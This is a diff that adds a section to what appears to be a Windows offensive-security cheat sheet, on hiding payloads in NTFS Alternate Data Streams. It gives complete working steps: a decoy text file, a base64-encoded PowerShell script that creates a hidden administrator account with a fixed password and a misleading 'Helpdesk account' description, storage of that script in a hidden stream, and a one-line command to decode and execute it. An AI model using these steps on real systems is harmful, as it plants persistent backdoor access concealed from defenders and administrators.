@@ -459,3 +459,38 @@ else
    Write-Host "No PuTTY logging identified."
 }
 ```
+
+## Hiding payloads in Alternate Data Streams (ADS)
+
+**Create a container file on an NTFS file system**<br />
+`echo This is a harmless text file :) > c:\windows\temp\harmless.txt`
+
+**Verify the contents of the container file**<br />
+`type c:\windows\temp\harmless.txt`<br />
+(output) `This is a harmless text file :)`
+
+**Check the file size of the container file**<br />
+`dir c:\windows\temp\harmless.txt`<br />
+(output) `1 File(s) 34 bytes`
+
+**Create powershell payload as base64 to add a backdoor account**<br />
+Run `cat | base64 -w 0; echo` then paste the following code, press ctrl-d (EOF) when finished.<br />
+```powershell
+$Password = ConvertTo-SecureString "+BackD00rAdmin+" -AsPlainText -Force
+New-LocalUser -Name "BDAdmin" -Password $Password -AccountNeverExpires -FullName "BD Admin" -Description "Helpdesk account, do not delete" -PasswordNeverExpires
+Add-LocalGroupMember -Group "Administrators" -Member "BDAdmin"
+```
+
+**Create the hidden payload data stream using the base64 output above**<br />
+`echo JFBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAiK0JhY2tEMDByQWRtaW4rIiAtQXNQbGFpblRleHQgLUZvcmNlCk5ldy1Mb2NhbFVzZXIgLU5hbWUgIkJEQWRtaW4iIC1QYXNzd29yZCAkUGFzc3dvcmQgLUFjY291bnROZXZlckV4cGlyZXMgLUZ1bGxOYW1lICJCRCBBZG1pbiIgLURlc2NyaXB0aW9uICJIZWxwZGVzayBhY2NvdW50LCBkbyBub3QgZGVsZXRlIiAtUGFzc3dvcmROZXZlckV4cGlyZXMKQWRkLUxvY2FsR3JvdXBNZW1iZXIgLUdyb3VwICJBZG1pbmlzdHJhdG9ycyIgLU1lbWJlciAiQkRBZG1pbiIK > c:\windows\temp\harmless.txt:payload.ps1`
+
+**Verify the size and contents of** `harmless.txt` **have not changed**<br />
+`dir c:\windows\temp\harmless.txt`<br />
+(output) `1 File(s) 34 bytes`<br />
+`type c:\windows\temp\harmless.txt`<br />
+(output) `This is a harmless text file :)`
+
+**Detonate the hidden payload to create the backdoor account**<br />
+```powershell
+powershell -command " &{[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-Content c:\windows\temp\harmless.txt -Stream payload.ps1 -Raw))) | Invoke-Expression}"
+```
